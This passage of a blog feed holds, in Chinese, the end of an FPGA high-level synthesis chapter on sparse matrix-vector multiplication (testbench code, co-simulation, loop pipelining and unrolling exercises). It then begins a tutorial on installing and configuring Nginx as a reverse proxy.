class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">matrixvector</span><span class="params">(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; i++) &#123;</span><br><span class="line">        DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SIZE; j++)</span><br><span class="line">            y0 += A[i][j] * x[j];</span><br><span class="line">        y[i] = y0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fail = <span class="number">0</span>;</span><br><span class="line">    DTYPE M[SIZE][SIZE] = &#123;&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line">    DTYPE x[SIZE] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    DTYPE y_sw[SIZE];</span><br><span class="line">    DTYPE values[] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> columnIndex[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> rowPtr[] = &#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    DTYPE y[SIZE];</span><br><span class="line"></span><br><span class="line">    spmv(rowPtr, columnIndex, values, y, x);</span><br><span class="line">    matrixvector(M, y_sw, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; i++)</span><br><span class="line">        <span class="keyword">if</span>(y_sw[i] != y[i])</span><br><span class="line">            fail = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fail == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"FAILED\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"PASS\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.4 ： 一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。">图6.4 ： 一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。</p><p>这个测试平台相对简单并且可能无法充分验证所有的输入都能正常输出。最主要的原因是，它仅仅只用了一个矩阵作为例子，相反，一个好的激励会测试许多矩阵。通常，会通过随机的方式产生输入的测试用例，并且重点测试边界用例。在这个例子中，我们不仅要保证值正确计算，同时保证通过加速器正确的被执行了，而且编译时间相关的parameter改变会在实现不同加速单元值折中。最关键的是，在相同的parameter上，我们能通过随机产生很多输入数据来进行测试。编译时间相关的参数每次发生变化，都需要我们重新编译代码。</p><p>创建一个复杂的激励来，通过随机数方式生成许多组测试数据。稀疏矩阵编译时间参数应该是可以修改的（例如，<strong>SIZE</strong>，<strong>NNZ</strong> 等）。创建一个HLS综合脚本，在编译时间参数合理范围改变时，能执行代码很多次。</p><h3 id="6-4-指定循环的属性"><a href="#6-4-指定循环的属性" class="headerlink" title="6.4 指定循环的属性"></a>6.4 指定循环的属性</h3><p>如果直接将上述代码进行综合，我们可以得到函数运行的时钟周期及资源占用率。但是，我们不能得到模块执行所需的时钟周期、任务执行的延迟和任务执行之间的间隔。因为这些都取依赖于输入数据，由<strong>spmv</strong>函数外部因素决定。最主要的因素是，内层循环执行的次数是由矩阵<strong>M</strong>中非0元素个数决定的。非0元素的个数在代码中是由常量<strong>NNZ</strong>决定的，虽然可以调用函数计算不同大小的矩阵，但是实际迭代次数是和输入数据相关的。另外，性能也会因为非0元素的分布、综合优化的约束产生不同。更复杂的是，迭代的次数由输入决定，许多可能的输入并没有被遍历。所以，对于工具而言，不通过复杂的分析和额外的信息，工具是不能知道spmv函数执行需要多少时钟周期。<strong>Vivado®HLS</strong> 工具也不能进行上述的分析。</p><p>spmv函数能正常工作的前提条件是什么？证明给定的前提条件，矩阵中每个非0元素实是不是在对应一次内层循的执行？</p><p>有几种方式能帮助工具进行性能的分析，其中一种方式就是想<strong>Vivado®HLS</strong>提供循环边界的额外信息。这可以通过使用<strong>loop_tripcount</strong> directive实现，它能让设计者指定最小、最大和平均迭代次数针对特定的循环。通过提供这些值， <strong>Vivado®HLS</strong> 能提供时钟周期级别的评估。</p><p>使用<strong>loop_tripcount</strong> directive 用变量指定循环的最小，最大和平均迭代次数，这样<strong>Vivado</strong>®HLS 工具能对当前设计时钟周期数目进行估计。这些不影响最后综合的结果，只会影响综合报告。</p><p>对spmv函数使用<strong>loop_tripcount</strong> directive，语法格式 # pragma HLS loop_tripcount min=X, max=Y, avg=Z 其中X，Y，Z正的常量。哪个循环需要使用directive?当改变参数（min、max和avg）以后，综合报告有什么不同？这对时钟周期有影响吗？这对资源占用有影响吗？</p><p><strong>loop_tripcount</strong> 引导能帮助设计者对函数的性能有个原始的估计。这样能比较相同的函数通过使用不同的directives或者对代码本身重构。但是，这不能确定<strong>min</strong>、<strong>max</strong>和 <strong>avg</strong> 参数。这也很难确定边界条件min和max的值。如果有测试平台，就有一种更准确的方式用于计算<strong>spmv</strong>函数执行的时钟周期数，那就是<strong>C/RTL</strong>协同仿真。</p><h3 id="6-5-C-RTL-协同仿真"><a href="#6-5-C-RTL-协同仿真" class="headerlink" title="6.5 C/RTL 协同仿真"></a>6.5 C/RTL 协同仿真</h3><p><strong>C/RTL</strong> 协同仿真能自动化测试Vivado®HLS工具生成的RTL代码，只需要在综合的时候提供测试平台。每次执行综合以后的代码和提供的测试平台，记录输入和输出结果。输入的值按照时钟转换成<strong>输入向量</strong>。这里的输入向量用于针对生成的RTL代码进行仿真，同时记录<strong>输出向量</strong>。更新综合后的代码， 再次运行测试平台并保存输入和输出数据。测试平台如果返回值是0，则表示成功；若激励返回非0值，则表示失败。</p><p><strong>C/RTL</strong> 协同仿真流程将VIvado®HLS 生成的<strong>RTL</strong>代码，通过C 测试平台，实现时钟周期级别的仿真。这样，就能准确对生成的<strong>RTL</strong>代码进行性能评估，即使性能与输入数据有关。被综合的函数运行周期最小值，最大值，平均值以及间隔在仿真完成以后都能准确的得到。</p><p>注意这些和时钟周期相关的参数是通过激励中测试数据得到的。所以，结果的质量和测试平台的质量息息相关。如果测试平台没有很好的对函数执行测试，那么结果将不准确。另外，输入测试向量都是基于理想的时序，不能反映模型实际工作时，外部接口对函数的影响。实际的性能可能会比仿真的要低，如果执行过程中阻塞在输入数据或对外部存储的访问上。不过，对于循环边界调试时变量的情况，设计者可以通过协同仿真的方式确定时钟周期个数。</p><p>C/RTL协同仿真能提供循环边界是变量的函数的延迟。它反馈函数运行时延迟的最小值、最大值和平均值以及函数运行间隔。这些延迟和测试平台输入的数据是强相关的。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/spmv_behavior.jpg" alt="图6.5  spmv函数内部循环流水执行过程和结构">图6.5 spmv函数内部循环流水执行过程和结构</p><p>当采用图6,4提供的测试平台时，函数运行的最小值、最大值和平均值以及函数间隔是多少个时钟周期？</p><h3 id="6-6-循环的优化与数组的分块"><a href="#6-6-循环的优化与数组的分块" class="headerlink" title="6.6 循环的优化与数组的分块"></a>6.6 循环的优化与数组的分块</h3><p>我们可以通过<strong>Vivado®HLS</strong> 工具得到当前函数的性能和面积的评估结果，然后可以考虑如何对函数进行优化。流水线、循环展开、数组分块是第一类最常用的优化方法。最典型的方式是从最内层的循环，然后根据需要向外层循环进行。</p><p>在这个例子中， 对最内层的<strong>L2</strong>循环进行流水线化也许是我们最先和最容易想到的优化方式。这个连续迭代的循环在执行上流水以后，总体运行会加快。如果不采用流水，<strong>L2</strong> 循环将按照串行执行。注意，<strong>L1</strong> 循环此时还是按照串行的方式执行。</p><p>图6.5演示了<strong>spmv</strong>函数在<strong>L2</strong>循环采用流水方式时运行的步骤。每次<strong>L2</strong>的循环都被II=3<em>I**I</em>=3流水化。流水线允许在外层循环执行一次迭代时，内层循环执行多次循环迭代。此时，内层循环II受限于递归（recurrence ）操作。II=3<em>I**I</em>=3是因为我们认为加法器有3个时钟周期的延迟。外部循环没有采用流水的方式，所以内层的循环必须在下外层L2循环开始执行前，计算完成并输出结果。</p><p>对最内层的L2 <strong>for</strong> 循环进行流水化，通过在spmv函数中增加流水directive如图6.2所示。II(initiation interval)最后是多少？在你指定II的值以后，最终目标的II值是增大了还是减少了？</p><p>观察执行步骤，我们可以发现有几个因素限制了循环执行性能。第一个因素，递归（recurrence ）操作限制了循环的 <strong>II</strong>。第二个因素，外层的循环没有采用流水的方式。一种高效计算稀疏矩阵向量乘法的方式，每个时钟周期把乘法器和加法器使用起来。当前的设计离这个目标还很远。</p><p>在章节4.3中，我们探究了几种设计优化技术，其中包括对不同的循环进行流水，循环展开，数组分割。掌握在这些技术之间进行权衡是一项挑战，因为它们之间经常相互依赖。我们通常联合使用这些技术，为了得到好的性能谨慎的选择其中一种而不选择另一种也许结果会更糟糕。例如，在我们使用循环展开是，设计者需要明白它对数据访问的影响。增加了对数据访问的操作但是设计性能又受限于数据访问时，优化毫无益处。同样，如果提供了冗余的存储端口，实际中使用率不高，这样对提高性能毫无帮助反而增加了资源的消耗。</p><p>仔细思考一下上述优化技术组合后复杂多变的样式，我们建议你尝试下面的练习：</p><p>对spmv设计进行综合，采用表6.1提供的10种directives，每种都有不同的流水，展开和分割针对不同的循环和数组。这些分割在不同的数组（values、columnIndex、x）上使用。你看到结果的趋势是如何的？增加了展开和分割，是有利于还是不利于面积？性能如何？为什么？</p><p> 表6.1 稀疏矩阵向量乘法可优化的方式</p><table><thead><tr><th></th><th>L1</th><th>L2</th></tr></thead><tbody><tr><td>case1</td><td>-</td><td>-</td></tr><tr><td>case2</td><td>-</td><td>pipeline</td></tr><tr><td>case3</td><td>pipeline</td><td>-</td></tr><tr><td>case4</td><td>unroll=2</td><td>-</td></tr><tr><td>case5</td><td>-</td><td>pipeline,unroll=2</td></tr><tr><td>case6</td><td>-</td><td>pipeline,unroll=2,cyclic=2</td></tr><tr><td>case7</td><td>-</td><td>pipeline,unroll=4</td></tr><tr><td>case8</td><td>-</td><td>pipeline,unroll=4,cyclic=4</td></tr><tr><td>case9</td><td>-</td><td>pipeline,unroll=8</td></tr><tr><td>case10</td><td>-</td><td>pipeline,unroll=8,cyclic=8</td></tr><tr><td>case11</td><td>-</td><td>pipeline,unroll=8,block=8</td></tr></tbody></table><p>如果你完成了上述练习，你会发现盲目的使用优化directives，可能不会得到你期望的结果。通常在设计时， 在思考下考虑应用的特性，选择针对设计的特定优化方式。当然，这也需要一些直觉能力和一些专用工具投入使用。虽然，搞清楚像<strong>Vivado®HLS</strong>这样复杂工具中每一个细节是困难乃至不可能的，但是我们能基于关键的方面建立思考模型。</p><p>上面我们在用例3和4中考虑对外层循环<strong>L1</strong>进行流水化操作而不是对内层循环。这种变化针对一个任务，可以提高潜在的并行程度。为了完成优化，<strong>Vivado®HLS</strong> 工具必须展开代码中所有的内层循环<strong>L2</strong> 。如果循环能全部展开，这样能减少计算循环边界的时间，同时也能消除递归（recurrences）。但是代码中的内层循环Vivado HLS是无法完全展开的，因为循环边界不是常量。</p><p>例如在实现上面提到的例子3，在最外层的循环<strong>L1</strong>使用流水化directive。在不设定目标<strong>II</strong>时，<strong>II</strong>值是多少？资源占用率发生了什么变化？增加了<strong>II</strong>后资源占用率结果如何？这与之前采对L2循环进行流水化，结果有什么不同？这和最基本的设计（无 directives）相比有什么不同？当你对外层循环进行展开时，结果到底如何？（提示：检查综合后的日志信息）</p><p>另外一种增加并行化的方式是对内层循环进行局部循环展开，就像之前例子5到10。这种变化实现更多的并行化，通过在相同的循环迭代中，执行更多的操作。有些情况，Vivado HLS 工具在对内层循环进行流水化时，通过实现更多操作来提高性能。但是，这还是很难提高内层循环的II，由于内层循环的递归操作。但是，在II大于1的情况下， 许多操作可以共享同一个计算单元。</p><p>图6.6展示了一个局部展开的代码。在这段代码中，<strong>L2</strong> 循环被分成2个循环，分别为<strong>L2_1</strong>和<strong>L2_2</strong>。最内层的循环<strong>L2_2</strong>执行的次数由参数<strong>S</strong>确定。内部循环包含了最原始的<strong>L2</strong>循环，其中循环边界是由最原始的<strong>L2</strong>循环确定的。代码中，<strong>L2_1</strong> 循环包含了不确定次数的乘法和加法操作，运算次数由参数<strong>S</strong>确定，和一次递归完成累加y0 += yt<em>y</em>0+=<em>y**t</em>。</p><p>注意图<strong>6.6</strong>中的代码和自动循环展开的代码是由一点点区别的。自动循环展开复制计算，但是保留每次计算先后顺序（除了当前的例子）。这就导致了计算顺序由内层循环决定，如图6.7左所示。对计算顺序进行调整后，操作上的依赖关系如图6.7 左边所示。在当前的代码中，最后累加求和是一个递归（recurrence ）。当使用浮点数据类型时，这种调整计算顺序的操作可能对程序产生改变，所以Vivado HLS对这种类型的代码不进行操作顺序自动调整。</p><p>这个设计可能会被综合、实现如图<strong>6.8</strong>所示的结果。在这个例子中，S=3<em>S</em>=3与II<em>I**I</em>最匹配，乘法器的延迟正好是3。所有的运算过程都是在一个乘法器和加法器上执行。比较这个例子与图<strong>6.5</strong>中的例子，我们可以发现一些缺点。最明显的是，内层循环的流水线长度很长，实现的时候需要多个更多的周期刷新流水线的输出，才能执行下一次外层<strong>L1</strong>循环。处理一行中非零元素和执行块<strong>S</strong> 相同。一行有个3个元素和一行有一个元素计算的时间是相同的。剩下的运算也需要在循环流水线中执行，即使他们的结果没有用。为了严格的比较两个设计的特性，我们需要了解设计对矩阵每行非零元素个数的预期。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> S = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">          DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  L1: <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_ROWS; i++) &#123;</span><br><span class="line">      DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">    L2_1: <span class="keyword">for</span> (<span class="keyword">int</span> k = rowPtr[i]; k &lt; rowPtr[i+<span class="number">1</span>]; k += S) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> HLS pipeline II=S</span></span><br><span class="line">          DTYPE yt = values[k] * x[columnIndex[k]];</span><br><span class="line">      L2_2: <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; S; j++) &#123;</span><br><span class="line">              <span class="keyword">if</span>(k+j &lt; rowPtr[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                  yt += values[k+j] * x[columnIndex[k+j]];</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          y0 += yt;</span><br><span class="line">      &#125;</span><br><span class="line">    y[i] = y0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.6  局部展开图6.2中**smpv**函数">图6.6 局部展开图6.2中<strong>smpv</strong>函数</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/spmv_partial_unroll.jpg" alt="图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加">图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://xupsh.github.io/pp4fpgas-cn/images/spmv_unrolled_behavior.jpg" alt="图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程">图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程</p><p>如果矩阵每行非零元素很少，则采用第一种实现方式较优；如果矩阵中每行非零元素较多，则第二种实现方式更好。</p><p>需要注意，这里存在一个关于先有鸡还是先有蛋的问题。我们需要知道目标器件和时钟周期，这样才能确定流水线中加法器能不能满足时序要求。只有在我们知道流水线的级数之后（也许S=1时，Vivado HLS才能识别到加法递归），我们才能选择合适版本的参数S，来满足II=1<em>I**I</em>=1。一旦我们确定了<strong>S</strong>，我们能通过<strong>C/RTL</strong>协同仿真来，通过一组测试数据，确定是不是达到了性能上的要求。因为循环边界是可变的，所以得到的性能参数是依赖于数据的，所以我们需要设定不同的<strong>S</strong>，来找到性能的最大值。改变器件的类型和工作频率会影响之前所有的设计！尽管看来去高层次综合（<strong>HLS</strong>）对解决问题提供的帮助不多，相比于RTL开发新版本然后进行验证，它开发起来快（代码编写方便）。</p><p>图6.8可以实现时，<strong>S</strong> 与加法器流水线等级相同。如果<strong>S</strong>设定较大，结果会怎样？如果<strong>S</strong> 设定较小，结果会怎样？如果目标<strong>II</strong>小于<strong>S</strong>会怎样？如果目标<strong>II</strong>大于<strong>S</strong>会怎样？</p><h3 id="6-7小结"><a href="#6-7小结" class="headerlink" title="6.7小结"></a>6.7小结</h3><p>在本章节中，我们介绍了系数矩阵向量乘法（SpMV），这延续了之前对矩阵运算的研究。SpMV 显得很有趣，因为它采用了一种特别的数据结构。为了减少大量的存储，矩阵采用行压缩的方式存储，这样就要求我们以一种非直接的方式对矩阵进行访问。</p><p>这一章节首先我们了<strong>Vivado®HLS</strong>工具测试和仿真的能力。我们采用一个基于SpMV简单的激励文件，讲解HLS工作流程。另外，我们对<strong>Vivado®HLS</strong>工具中<strong>C/RTL</strong> 协同仿真进行了讲解。这对我们得到设计准确性能结果是十分重要。矩阵越不稀疏，则更多的计算需要执行。在测试平台确定以后，协同仿真可以提供程序运行的精确仿真。这样就可以达到执行周期和性能结果。最后，我们讨论了采用循环优化和数组分块对代码进行优化。</p><blockquote><p><a href="https://xupsh.github.io/pp4fpgas-cn/" target="_blank" rel="noopener">fpga并行编程</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SpMV </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpMV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx</title>
      <link href="/2019/05/19/Nginx/"/>
      <url>/2019/05/19/Nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx安装及配置"><a href="#Nginx安装及配置" class="headerlink" title="Nginx安装及配置"></a>Nginx安装及配置</h1><blockquote><p>本文参考：</p><p><a href="https://www.runoob.com/linux/nginx-install-setup.html" target="_blank" rel="noopener">Nginx安装配置_菜鸟教程</a></p><p><a href="http://www.nginx.cn/doc/" target="_blank" rel="noopener">Nginx中文文档</a></p><p><a href="https://www.cnblogs.com/jingmoxukong/p/5945200.html" target="_blank" rel="noopener">Nginx简易教程</a></p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>什么是nginx?</strong></p><p>Nginx (engine x) 是一款轻量级的Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。</p><p><strong>什么是反向代理？</strong></p><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://pic2.zhimg.com/80/v2-ed1a226ae675b102b6eb7394b6db9235_hd.jpg" alt="img"></p><h2 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a><strong>安装与使用</strong></h2><p><strong>安装</strong></p><p>nginx官网下载地址：<a href="https://link.zhihu.com/?target=http%3A//nginx.org" target="_blank" rel="noopener">http://nginx.org</a>，发布版本分为 Linux 和 windows 版本。</p><p>也可以下载源码，编译后运行。</p><p><strong>从源代码编译 Nginx</strong></p><p>把源码解压缩之后，在终端里运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>默认情况下，Nginx 会被安装在 /usr/local/nginx。通过设定编译选项，你可以改变这个设定。</p><p><strong>Windows 安装</strong></p><p>为了安装 Nginx / Win32，需先下载它(<a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">Nginx官方下载</a>)。然后解压之，然后运行即可。下面以 C 盘根目录为例说明下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx-0.8.54   start nginx</span><br></pre></td></tr></table></figure><p>Nginx / Win32 是运行在一个控制台程序，而非 windows 服务方式的。服务器方式目前还是开发尝试中。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a><strong>使用</strong></h3><p>nginx 的使用比较简单，就是几条命令。</p><p><strong>常用到的命令如下：</strong></p><ul><li><strong>nginx -s stop ：</strong>快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。</li><li><strong>nginx -s quit ：</strong>平稳关闭Nginx，保存相关信息，有安排的结束web服务。</li><li><strong>nginx -s reload ：</strong>因改变了Nginx相关配置，需要重新加载配置而重载。</li><li><strong>nginx -s reopen ：</strong>重新打开日志文件。</li><li><strong>nginx -c filename ：</strong>为 Nginx 指定一个配置文件，来代替缺省的。</li><li><strong>nginx -t ：</strong>不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。</li><li><strong>nginx -v：</strong>显示 nginx 的版本。</li><li><strong>nginx -V：</strong>显示 nginx 的版本，编译器版本和配置参数。</li></ul><p>如果不想每次都敲命令，可以在nginx安装目录下新添一个启动批处理文件startup.bat，双击即可运行。内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程</span><br><span class="line">nginx.exe -s stop</span><br><span class="line"></span><br><span class="line">rem 测试配置文件语法正确性</span><br><span class="line">nginx.exe -t -c conf/nginx.conf</span><br><span class="line"></span><br><span class="line">rem 显示版本信息</span><br><span class="line">nginx.exe -v</span><br><span class="line"></span><br><span class="line">rem 按照指定配置去启动nginx</span><br><span class="line">nginx.exe -c conf/nginx.conf</span><br></pre></td></tr></table></figure><p>如果是运行在 Linux 下，写一个 shell 脚本，大同小异。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="nginx-配置实战"><a href="#nginx-配置实战" class="headerlink" title="nginx 配置实战"></a><strong>nginx 配置实战</strong></h3><p>我始终认为，各种开发工具的配置还是结合实战来讲述，会让人更易理解。</p><h3 id="http反向代理配置"><a href="#http反向代理配置" class="headerlink" title="http反向代理配置"></a><strong>http反向代理配置</strong></h3><p>我们先实现一个小目标：不考虑复杂的配置，仅仅是完成一个 http 反向代理。</p><h3 id="nginx-conf-配置文件如下："><a href="#nginx-conf-配置文件如下：" class="headerlink" title="nginx.conf 配置文件如下："></a><strong>nginx.conf 配置文件如下：</strong></h3><p>注：conf / nginx.conf 是 nginx 的默认配置文件。你也可以使用 nginx -c 指定你的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#运行用户</span><br><span class="line">#user somebody;</span><br><span class="line"></span><br><span class="line">#启动进程,通常设置成和cpu的数量相等</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#全局错误日志</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/error.log;</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/notice.log  notice;</span><br><span class="line">error_log  D:/Tools/nginx-1.10.1/logs/info.log  info;</span><br><span class="line"></span><br><span class="line">#PID文件，记录当前启动的nginx的进程ID</span><br><span class="line">pid        D:/Tools/nginx-1.10.1/logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">#工作模式及连接数上限</span><br><span class="line">events &#123;</span><br><span class="line">   worker_connections 1024;    #单个后台worker 